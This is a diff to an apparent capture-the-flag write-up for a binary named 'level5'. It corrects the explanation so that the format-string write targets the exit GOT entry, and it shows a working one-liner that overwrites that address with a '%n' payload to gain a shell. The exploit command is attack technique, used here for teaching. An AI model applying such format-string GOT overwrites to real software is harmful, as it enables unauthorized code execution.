@@ -224,7 +224,7 @@ We need the address `c` to be equal to *134513828* to get access to the shell wi
 
 ### Solution
 
-We can execute the `printf` buffer to store the number *134513828* on the address `0x08049838` where the `m` variable is with this line. Of course, because we are running a shell through a pipe, we can keep the `stdin` open like the same trick from the last level:
+We can execute the `printf` buffer to store the number *134513828* on the address `0x08049838` where the `exit` *GOT*'s address is with this line. Of course, because we are running a shell through a pipe, we can keep the `stdin` open like the same trick from the last level:
 ```bash
 $(printf '\x38\x98\x04\x08' && echo '%134513824c%4$n' ; cat ) | ./level5
 
